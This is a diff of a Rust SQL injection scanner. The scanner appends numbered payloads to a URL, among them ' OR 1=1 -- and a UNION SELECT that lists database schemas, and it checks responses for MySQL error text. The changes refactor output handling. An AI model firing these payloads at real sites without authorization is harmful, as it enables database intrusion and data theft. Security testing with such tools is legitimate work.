@@ -2,11 +2,10 @@ use std::process::exit;
 use reqwest::Client;
 use regex::Regex;
 use scraper::{Html, Selector};
-use colored::Colorize;
 
 pub async fn validation_exist_sql_injection(
     url: &str,
-    payload: &str) -> Result<(), reqwest::Error> {
+    payload: &str) -> Result<String, reqwest::Error> {
 
     let client = Client::new();
     let set_payload = match payload {
@@ -18,18 +17,10 @@ pub async fn validation_exist_sql_injection(
         "6" => "' OR 1=0 --",
         "7" => "' OR 1=1 --",
         "8" => "-1 union select 1, 2, group_concat(schema_name) from information_schema.schemata",
-        _ => {
-            println!("Options not found");
-            return Ok(());
-        }
+        _ => return Ok("Option not found".to_string())
     };
 
-    match response(&client, url, set_payload, payload == "8").await {
-        Ok(message) => println!("{}", message),
-        Err(error) => println!("Request error: {}", error),
-    }
-
-    Ok(())
+    response(&client, url, set_payload, payload == "8").await
 }
 
 async fn response(
@@ -39,7 +30,6 @@ async fn response(
     show_body: bool) -> Result<String, reqwest::Error> {
 
     let test_url = format!("{}{}", url, payload);
-    println!("{}", "Testing.....".blue());
 
     let response = client.get(&test_url).send().await?;
 
@@ -65,9 +55,9 @@ async fn response(
 
 fn contains_sql_injection(body: &str) -> Result<String, String> {
     if body.contains("mysql_fetch_array()") || body.contains("SQL syntax") {
-        Ok("[x] Vulnerable to SQL Injection".to_string())
+        Ok("✅ Vulnerable to SQL Injection".to_string())
     } else {
-        Err("[] No vulnerabilities found".to_string())
+        Err("❌ No vulnerabilities found".to_string())
     }
 }
 
